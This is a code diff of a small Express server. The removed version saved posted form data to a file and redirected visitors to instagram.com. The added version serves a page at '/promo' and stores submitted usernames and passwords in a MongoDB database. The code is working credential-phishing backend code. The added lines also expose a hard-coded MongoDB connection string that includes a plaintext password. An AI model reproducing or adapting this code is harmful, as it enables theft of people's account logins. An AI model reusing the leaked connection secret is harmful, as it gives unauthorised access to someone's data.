@@ -1,48 +1,46 @@
 const fs = require('fs');
 const express = require('express');
 const bodyParser = require('body-parser');
+const mongoose = require('mongoose');
 
 const app = express();
 
-const instaUrl = 'https://instagram.com/';
+app.use(express.json())
 
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
+mongoose.connect('mongodb+srv://witooz123:Ds1wfuGUxaqGvdSW@datacluster.s71xtyr.mongodb.net/?retryWrites=true&w=majority', { useNewUrlParser: true, useUnifiedTopology: true })
+    .then(() => {
+        console.log('Conexión exitosa a MongoDB');
+    })
+    .catch((error) => {
+        console.error('Error de conexión a MongoDB:', error);
+    });
 
-let datos;
+// Definir un modelo de datos (ejemplo)
+const Message = mongoose.model('Message', {
+  user: String,
+  passwd: String,
+  timestamp: { type: Date, default: Date.now }
+});
 
-// Cargar datos desde el archivo al inicio del servidor de manera síncrona
-try {
-    const data = fs.readFileSync('data.json', 'utf8');
-    datos = JSON.parse(data);
-
-    // Verificar si datos es un array
-    if (!Array.isArray(datos)) {
-        console.error('Los datos no son un array. Reiniciando con un array vacío.');
-        datos = [];
-    }
-} catch (err) {
-    console.error('Error al leer el archivo:', err);
-    datos = [];
-    process.exit(1);
-}
-
-app.get('/', (req, res) => {
+app.get('/promo', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
 
-app.post('/', (req, res) => {
-    const data = req.body;
-
-    if (data) {
-        datos.push(data);
-        fs.writeFileSync('data.json', JSON.stringify(datos, null, 2), 'utf-8');
-        console.log('Datos recibidos -> \n', data);
-        res.redirect(instaUrl);
-    } else {
-        res.send('Datos no enviados');
+app.post('/promo', async (req, res) => {
+    try {
+        const { user, passwd } = req.body; // Extraer user y passwd del cuerpo de la solicitud
+    
+        // Guardar el mensaje en MongoDB
+        const message = new Message({ user, passwd }); // Construir el objeto Message directamente con user y passwd
+        await message.save();
+    
+        res.status(201).json(message);
+    } catch (error) {
+        console.error(error);
+        res.status(500).send('Error al guardar el mensaje en la base de datos.');
     }
 });
+
 
 const PORT = process.env.PORT || 3000;
 
